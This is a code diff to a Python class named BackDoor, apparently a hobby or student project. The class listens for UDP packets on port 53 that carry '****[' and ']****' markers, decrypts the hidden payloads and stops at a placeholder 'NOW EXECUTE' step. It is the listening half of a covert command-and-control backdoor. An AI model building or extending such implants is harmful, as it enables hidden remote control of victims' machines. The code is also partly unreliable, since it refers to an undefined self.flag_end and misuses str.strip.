@@ -15,7 +15,6 @@ class BackDoor:
         self.flag_begin = "****["
         self.flag_close = "]****"
         self.port = 53
-        self.hex_data = ""
 
     def start(self):
         print("Starting")
@@ -29,15 +28,11 @@ class BackDoor:
             print("Permission error! Run as sudo or admin!")
             sys.exit()
 
-    def process_packets(self, data):
-        if data == 124:
-            self.decrypt_data()
-            return
-            # Convert ascii to character
-        hex_byte = self.get_char(data)
-        print(f"Received: {hex_byte}")
-        # Add to hex string
-        self.hex_data += hex_byte
+    def process_packets(self, data: str):
+        print("Stripping flags to extract data")
+        stripped_msg = data.strip(self.flag_begin).rstrip(self.flag_end)
+        decrypted_msg = self.decrypt_data(stripped_msg)
+        print("NOW EXECUTE")
 
     def get_ascii(self, hex_char) -> int:
         """Returns ascii code of char"""
@@ -47,30 +42,28 @@ class BackDoor:
         """Gets char from ascii code"""
         return chr(ascii)
     def filter_packets(self, packet):
-        print("1")
         try:
             if UDP in packet and packet[UDP].load.decode().startswith(self.flag_begin) \
                     and packet[UDP].load.decode().endswith(self.flag_close):
-                print(2)
-                print(f"{packet[UDP].load.decode()} <- payload")
-                #self.process_packets(packet[UDP].sport)
+                msg = packet[UDP].load.decode()
+                print(f"Received authenticated packet: {msg}")
+                self.process_packets(msg)
         except:
             return
 
-    def decrypt_data(self):
-        encrypted_string = bytes.fromhex(self.hex_data)
-        self.set_hex()
-        print(f"Combined byte stream of encrypted message: {encrypted_string}")
+    def decrypt_data(self, encrypted_msg: str) -> str:
+        encrypted_byte_stream = bytes.fromhex(encrypted_msg)
         cipher = self.generate_cipher()
         # Initialize a decryptor object
         decryptor = cipher.decryptor()
         # Initialize an unpadder object
         unpadder = padding.PKCS7(128).unpadder()
         # Decrypt and remove padding
-        padded_message = decryptor.update(encrypted_string) + decryptor.finalize()
+        padded_message = decryptor.update(encrypted_byte_stream) + decryptor.finalize()
         msg = unpadder.update(padded_message) + unpadder.finalize()
         msg = msg.decode()
         print(f"Decrypted message: {msg}\n")
+        return msg
 
     def set_hex(self):
         self.hex_data = ""
